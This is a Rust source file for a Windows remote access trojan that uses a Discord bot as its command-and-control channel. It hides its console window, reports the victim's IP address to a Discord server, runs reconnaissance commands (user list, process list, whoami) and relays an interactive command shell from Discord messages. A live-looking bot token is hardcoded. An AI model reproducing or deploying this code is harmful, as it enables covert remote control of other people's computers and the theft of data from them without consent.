#![windows_subsystem = "windows"]

use std::sync::RwLock;
use std::time::Duration;
use serenity::{
    async_trait, client::Context, model::{channel::{Message, ChannelType}, gateway::Ready, id::{ChannelId}, application::interaction::InteractionResponseType}, prelude::*,
    framework::standard::{
        macros::{command, group},
        CommandResult, StandardFramework,
    },
};
use chrono::{DateTime, Utc};
use uuid::Uuid;
use std::io::{Read};
use std::os::windows::io::AsRawHandle;
use std::process::Child;

use tokio::sync::Mutex;
lazy_static::lazy_static! {
    static ref CMD_PROCESS: Mutex<Option<Child>> = Mutex::new(None);
}


mod commands;
use commands::recon::*;

mod utils;

use utils::utils::*;

static CHANNEL_NAME: RwLock<Option<Uuid>> = RwLock::new(None);
static AGENT_CAT_ID: RwLock<Option<ChannelId>> = RwLock::new(None);
static AGENT_COMMAND_ID: RwLock<Option<ChannelId>> = RwLock::new(None);
static CMD_SESSION_ID: RwLock<Option<ChannelId>> = RwLock::new(None);


#[group("info")]
#[commands(c_userlist, c_tasklist, c_whoami)]
struct Info;

#[group("cmd_session")]
#[commands(exit, cmdsesh, run)]
struct CmdSession;

#[group("general")]
#[commands("clear")]
struct General;

#[tokio::main]
async fn main() {

    // Configure the client with your Discord bot token in the environment.
    let token = String::from("MTA4NzQ2MzExMjY3ODA1NTkzNg.Gf19_l.w7FqiCApRPbPZWws6YVdRjUaT4jx7Ap_zJWlrY");

    // Set gateway intents, which decides what events the bot will be notified about
    let intents = GatewayIntents::GUILD_MESSAGES
        | GatewayIntents::DIRECT_MESSAGES
        | GatewayIntents::MESSAGE_CONTENT;

    let framework = StandardFramework::new()
        .configure(|c| c.prefix("!")) // Set the bot's command prefix
        .group(&GENERAL_GROUP).group(&CMDSESSION_GROUP).group(&INFO_GROUP);

    // Create our client object with the token and intents, throws error if building the client.
    let mut client =
        Client::builder(&token, intents)
            .event_handler(Handler)
            .framework(framework)
            .await.expect("Error when creating the client");

    if let Err(why) = client.start().await {
        println!("Client error: {:?}", why);
    }
}


struct Handler;

#[async_trait]
impl EventHandler for Handler {
    async fn ready(&self, ctx: Context, ready: Ready) {
        println!("{} is connected!", ready.user.name);

        match get_or_create_uuid() {
            Ok(uuid) => {
                println!("UUID: {:?}", uuid);
                *CHANNEL_NAME.write().unwrap() = Some(uuid);
            }
            Err(e) => {
                eprintln!("Error creating file: {:?}", e);
                std::process::exit(1);
            }
        };

        // Create a text channel in the first guild the bot is connected to
        let guilds = &ready.guilds;
        if let Some(guild_id) = guilds.first().map(|g| g.id) {
            println!("GUILD ID: {:?}", guild_id);
            *AGENT_CAT_ID.write().unwrap() = get_category_uuid(&ctx, Some(guild_id)).await;

            if let Err(why) = get_agent_ip(&ctx).await {
                println!("Ran into error when sending ip sadly: {}", why);
            };
        }
    }
}

#[command]
#[aliases("userlist")]
async fn c_userlist(ctx: &Context, msg: &Message) -> CommandResult {
    match is_designated_channel(msg) {
        Ok(true) => {
            if let Err(why) = msg.channel_id.say(&ctx.http, userlist()).await {
                eprintln!("Error sending message: {:?}", why);
            }
        }
        Ok(false) => {}
        Err(why) => {
            if let Err(why) = msg.channel_id.say(&ctx.http, why).await {
                eprintln!("Error sending message: {:?}", why);
            }
        }
    }

    Ok(())
}

#[command]
#[aliases("tasklist")]
async fn c_tasklist(ctx: &Context, msg: &Message) -> CommandResult {
    match is_designated_channel(msg) {
        Ok(true) => {
            let tasklist_str = tasklist();
            let chunks = split_tasklist(&tasklist_str, 1900); // Discord has a 2000 character limit per message; 1900 gives some buffer

            for chunk in chunks {
                if let Err(why) = msg.channel_id.say(&ctx.http, &chunk).await {
                    eprintln!("Error sending message: {:?}", why);
                }
            }
        }
        Ok(false) => {}
        Err(why) => {
            if let Err(why) = msg.channel_id.say(&ctx.http, why).await {
                eprintln!("Error sending message: {:?}", why);
            }
        }
    }

    Ok(())
}

#[command]
#[aliases("whoami")]
async fn c_whoami(ctx: &Context, msg: &Message) -> CommandResult {
    match is_designated_channel(msg) {
        Ok(true) => {
            if let Err(why) = msg.channel_id.say(&ctx.http, whoami()).await {
                eprintln!("Error sending message: {:?}", why);
            }
        }
        Ok(false) => {}
        Err(why) => {
            if let Err(why) = msg.channel_id.say(&ctx.http, why).await {
                eprintln!("Error sending message: {:?}", why);
            }
        }
    }

    Ok(())
}

#[command]
async fn cmdsesh(ctx: &Context, msg: &Message) -> CommandResult {
    if is_designated_channel(msg)? {
        let sent_message = msg
            .channel_id
            .send_message(&ctx.http, |m| {
                m.content("Are you sure you want to open a command session?")
                    .components(|c| {
                        c.create_action_row(|row| {
                            row.create_select_menu(|menu| {
                                menu.custom_id("session_dialog");
                                menu.placeholder("OPTIONS");
                                menu.options(|f| {
                                    f.create_option(|o| o.label("✅ Yes").value("Yes"));
                                    f.create_option(|o| o.label("❌ No").value("No"))
                                })
                            })
                        })
                    })
            })
            .await
            .unwrap();

        let interaction = match sent_message
            .await_component_interaction(&ctx)
            .timeout(Duration::from_secs(60 * 3))
            .await
        {
            Some(x) => x,
            None => {
                sent_message.reply(&ctx, "Timed out").await.unwrap();
                return Ok(());
            }
        };

        let decision = &interaction.data.values[0];

        if decision == "Yes" {
            sent_message.delete(&ctx).await.unwrap();

            let guild_id = msg.guild_id.unwrap();
            let category_id = AGENT_CAT_ID.read().unwrap().unwrap();

            let session_channel = guild_id
                .create_channel(&ctx.http, |c| {
                    let now: DateTime<Utc> = Utc::now();
                    c.name(format!("cmd-session ({})", now)).kind(ChannelType::Text).category(category_id).topic("This is an interactive session with the agent. To exit the session and close this channel, please try '!exit'.")
                })
                .await
                .unwrap();
            *CMD_SESSION_ID.write().unwrap() = Option::from(session_channel.id);
            create_cmd_process().await?;

            interaction
                .create_interaction_response(&ctx, |r| {
                    r.kind(InteractionResponseType::ChannelMessageWithSource)
                        .interaction_response_data(|d| {
                            d.ephemeral(true)
                                .content(format!("Please see channel {} for your interactive session!", session_channel.mention()))
                        })
                })
                .await
                .unwrap();
        } else if decision == "No" {
            interaction
                .create_interaction_response(&ctx, |r| {
                    r.kind(InteractionResponseType::ChannelMessageWithSource)
                        .interaction_response_data(|d| {
                            d.ephemeral(true)
                                .content("User denied session creation")
                        })
                })
                .await
                .unwrap();
            sent_message.delete(&ctx).await.unwrap();
        }
    }

    Ok(())
}


#[command]
async fn run(ctx: &Context, msg: &Message) -> CommandResult {
    if session_handler(msg)? {
        let mut process = CMD_PROCESS.lock().await;
        let mut buf = vec![];

        if let Some(process) = process.as_mut() {
            use std::io::Write;
            let content = msg.content.trim();
            let command = content.strip_prefix("!run ").expect("Invalid command format").as_bytes();
            match process.stdin.as_mut().unwrap().write_all(command) {
                Err(why) => panic!("couldn't write to shell stdin: {}", why.to_string()),
                Ok(_) => println!("send command to shell"),
            }

            // Because `stdin` does not live after the above calls, it is `drop`ed,
            // and the pipe is closed.
            //
            // This is very important, otherwise `wc` wouldn't start processing the
            // input we just sent.

            use tokio::io::AsyncWriteExt;
            let mut output = std::io::Cursor::new(Vec::new());
            // The `stdout` field also has type `Option<ChildStdout>` so must be unwrapped.
            match process.stdout.as_mut().unwrap().read_to_end(&mut buf) {
                Err(why) => panic!("couldn't read shell stdout: {}", why.to_string()),
                Ok(_) => AsyncWriteExt::write_all(&mut output, &buf).await.unwrap(),
            };
            let output_string = String::from_utf8(output.into_inner()).unwrap();

            println!("{}", output_string)
        }
    }
    Ok(())
}

#[command]
async fn exit(ctx: &Context, msg: &Message) -> CommandResult {
    match session_handler(msg) {
        Ok(true) => {
            if let Err(why) = msg.channel_id.say(&ctx.http, "Deleting channel...").await {
                eprintln!("Error sending message: {:?}", why);
            }
            let channel_id = CMD_SESSION_ID.read().unwrap().unwrap();
            channel_id.delete(&ctx).await.expect("Error deleting the channel");
        }
        Ok(false) => {}
        Err(why) => {
            if let Err(why) = msg.channel_id.say(&ctx.http, why).await {
                eprintln!("Error sending message: {:?}", why);
            }
        }
    }
    Ok(())
}

#[command]
async fn clear(ctx: &Context, msg: &Message) -> CommandResult {
    let channel_id = msg.channel_id;
    let mut messages = channel_id
        .messages(&ctx.http, |retriever| retriever.limit(100))
        .await?;

    while !messages.is_empty() {
        channel_id.delete_messages(&ctx.http, &messages).await?;

        // Fetch the next batch of messages
        messages = match channel_id
            .messages(&ctx.http, |retriever| retriever.limit(100).before(messages.last().unwrap().id))
            .await
        {
            Ok(batch) if !batch.is_empty() => batch,
            _ => break,
        };
    }

    Ok(())
}
